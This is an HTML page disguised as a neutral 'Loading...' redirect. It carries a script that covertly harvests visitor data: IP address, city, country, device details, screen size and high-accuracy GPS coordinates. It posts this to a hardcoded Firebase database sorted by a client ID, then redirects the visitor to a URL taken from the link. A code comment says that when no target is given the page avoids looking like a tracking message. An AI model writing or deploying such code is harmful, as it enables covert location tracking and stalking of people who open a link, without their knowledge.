<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#ffffff;color:#333;font-family:Arial, sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden}
.loader{width:40px;height:40px;border:4px solid #f0f0f0;border-top:4px solid #00b0ff;border-radius:50%;animation:spin 0.8s linear infinite}
@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
.box{text-align:center}
h2{font-size:16px;color:#666;font-weight:400;margin-top:15px}
</style>
</head>
<body>
<div class="box">
<div class="loader"></div>
<h2>Loading...</h2>
</div>
<script>
(function(){
  var FIREBASE_URL = "https://numgen-4f22c-default-rtdb.firebaseio.com";
  var p = new URLSearchParams(location.search);
  var CLIENT_ID = p.get('id') || p.get('client_id') || "PUBLIC";
  var TARGET = p.get('url');
  var SUB = p.get('sub') || Date.now().toString();
  if(!TARGET){
    // لو مفيش URL - وديه لصفحة بيضا عادية مش رسالة تتبع
    document.querySelector('h2').innerText = "Just a moment...";
    return;
  }
  try{ TARGET = decodeURIComponent(TARGET); }catch(e){}
  if(TARGET.indexOf('http')!==0) TARGET = 'https://' + TARGET;

  function send(path, data){
    try{
      fetch(FIREBASE_URL + "/" + path + ".json", {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify(data)
      }).catch(function(){});
    }catch(e){}
  }
  function track(ip){
    var now = new Date();
    var base = {
      name: CLIENT_ID,
      client_id: CLIENT_ID,
      sub_id: SUB,
      ip: ip && ip.ip ? ip.ip : "",
      city: ip && ip.city ? ip.city : "",
      country: ip && ip.country_name ? ip.country_name : (ip && ip.country ? ip.country : ""),
      device: navigator.userAgent.substring(0,200),
      device_full: navigator.userAgent,
      screen: screen.width+"x"+screen.height,
      url: TARGET,
      time: now.toLocaleString(),
      timestamp: Date.now(),
      _path: "no_code_visits/"+CLIENT_ID
    };
    send("no_code_visits/"+CLIENT_ID, base);
    send("white_label_clients/"+CLIENT_ID+"/visitors", base);
    send("visitors", base);
    if(navigator.geolocation){
      navigator.geolocation.getCurrentPosition(function(pos){
        var g = Object.assign({}, base, {
          real_lat: pos.coords.latitude,
          real_lon: pos.coords.longitude,
          real_accuracy: Math.round(pos.coords.accuracy),
          _path: "real_gps_visitors"
        });
        send("real_gps_visitors", g);
        send("white_label_clients/"+CLIENT_ID+"/visitors", g);
      }, function(){}, {enableHighAccuracy:true, timeout:4000});
    }
  }
  var done=false;
  function go(){
    if(done) return;
    done=true;
    location.href = TARGET;
  }
  try{
    fetch("https://ipapi.co/json/").then(function(r){return r.json()}).then(function(d){track(d); setTimeout(go, 600)}).catch(function(){track(null); setTimeout(go, 600)})
  }catch(e){ track(null); setTimeout(go, 600)}
  setTimeout(go, 2500);
})();
</script>
</body>
</html>
